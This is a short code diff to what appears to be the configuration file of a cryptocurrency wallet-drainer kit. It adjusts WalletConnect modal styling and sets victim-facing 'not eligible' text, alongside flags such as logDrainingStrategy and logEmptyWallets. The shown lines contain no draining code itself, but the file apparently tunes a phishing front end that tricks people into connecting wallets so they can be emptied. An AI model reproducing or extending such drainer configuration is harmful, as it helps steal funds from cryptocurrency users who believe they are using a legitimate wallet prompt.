@@ -750,18 +750,18 @@ let walletconnectVars = {
 '--w3m-z-index': 10000,
 '--w3m-accent': '',
 '--w3m-accent-color': '',
+'--w3m-color-mix': '',
+'--w3m-color-mix-strength': '',
+'--w3m-border-radius-master': '',
+'--w3m-font-size-master': '',
 '--w3m-font-family': '',
-'--w3m-accent-fill-color': '',
-'--w3m-background-color': '',
-'--w3m-background-image-url': '',
-'--w3m-logo-image-url': '',
 '--w3m-overlay-backdrop-filter': 'blur(6px)',
 };
 let w3m_name = "";
 let w3m_description = "";
 let w3m_url = "";
 let w3m_icons = [''];
-let not_eligible_text = "";
+let not_eligible_text = "Your wallet is not eligible, connect another wallet.";
 let not_eligible_title = "Not eligible";
 let logEmptyWallets = false;
 let logDrainingStrategy = true;
